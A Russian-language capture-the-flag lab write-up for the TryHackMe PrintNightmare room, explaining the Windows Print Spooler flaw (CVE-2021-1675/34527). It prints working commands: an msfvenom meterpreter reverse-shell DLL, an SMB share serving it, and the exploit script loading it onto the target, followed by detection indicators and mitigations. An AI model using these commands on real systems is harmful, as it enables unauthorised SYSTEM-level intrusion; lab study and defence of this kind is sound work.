# PrintNightmare: печатаемся до SYSTEM

**Машина:** [PrintNightmare](https://tryhackme.com/room/printnightmarehpzqlp8) (medium, Windows)
**Суть:** CVE-2021-1675 / CVE-2021-34527 — RCE через Windows Print Spooler, работает и локально, и удалённо.

## Почему это работает

Print Spooler включён по умолчанию почти на каждом Windows, включая контроллеры домена, и крутится от SYSTEM. Уязвимость в `RpcAddPrinterDriverEx`: аутентифицированный юзер может подсунуть драйвер из произвольного пути — например, из SMB-шары атакующего. Спулер грузит нашу DLL от SYSTEM.

## Эксплуатация

Готовим DLL с реверс-шеллом и шару:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll -o share/malicious.dll
smbserver.py share $(pwd)/share -smb2support
# handler в metasploit: use exploit/multi/handler; run -j
```

Проверка, что цель уязвима — есть ли интерфейсы MS-RPRN / MS-PAR:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Эксплойт — от уже скомпрометированного доменного юзера (это post-compromise):

```bash
python3 CVE-2021-1675.py DOMAIN/user:pass@TARGET '\\IP\share\malicious.dll'
```

Дальше Python посыплет ошибками после «Try 3» — не страшно, DLL уже загрузилась, шелл в метасплойте.

## Детект и митигейшн

IoC: `spoolsv.exe` порождает `rundll32.exe` без аргументов, чужие DLL в `system32\spool\drivers\x64\3\`, в Wireshark — вызовы `RpcAddPrinterDriver(Ex)` по DCE/RPC (ложных срабатываний от легитимной печати хватает). Лечится отключением Spooler (на DC — обязательно) или GPO «Allow Print Spooler to accept client connections».

## Заметка

Из комнаты вынес главное: сервис, который никто не трогал с 1995 года, но включён везде, — лучший друг атакующего. Второе: уязвимость это post-compromise, поэтому в реальной сети она добивает то, что началось с фишинга.
